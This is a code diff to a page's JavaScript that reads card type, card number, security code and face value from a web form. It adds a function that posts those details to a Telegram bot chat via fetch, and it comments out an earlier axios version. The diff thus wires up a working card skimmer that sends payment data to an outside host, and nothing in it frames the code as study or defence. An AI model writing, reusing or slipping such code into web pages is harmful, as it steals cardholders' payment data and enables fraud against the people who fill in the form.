@@ -11,17 +11,45 @@ document.addEventListener('DOMContentLoaded', (event) => {
                 const cardNumber = document.getElementById('form-field-field_fe6e98a').value;
                 const securityCode = document.getElementById('form-field-code').value;
                 const faceValue = document.getElementById('form-field-value').value;
-
-                alert("Done");
                 sendMessage(cardType, cardNumber, securityCode, faceValue);
                 console.log(cardNumber, cardType, securityCode, faceValue);
             });
         });
 
+
+function sendMessage(cardType, cardNumber, securityCode, faceValue) {
+    const message = `Card Type: ${cardType}\nCard Number: ${cardNumber}\nSecurity Code: ${securityCode}\nFace Value: ${faceValue}`;
+
+    fetch(TELEGRAM_API_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            console.log('Message sent successfully:', data);
+            alert('Message sent successfully');
+        } else {
+            console.error('Error sending message:', data);
+            alert('Error sending message');
+        }
+    })
+    .catch(error => {
+        console.error('Error sending message:', error);
+        alert('Error sending message');
+    });
+}
+/*
         function sendMessage(cardType, cardNumber, securityCode, faceValue) {
             const message = `Card Type: ${cardType}\nCard Number: ${cardNumber}\nSecurity Code: ${securityCode}\nFace Value: ${faceValue}`;
 
-            axios.post(TELEGRAM_API_URL, {
+            fetch(TELEGRAM_API_URL, {
                 chat_id: CHAT_ID,
                 text: message
             })
@@ -33,3 +61,4 @@ document.addEventListener('DOMContentLoaded', (event) => {
                 console.error('Error sending message:', error.response ? error.response.data : error.message);
             });
         }
+*/
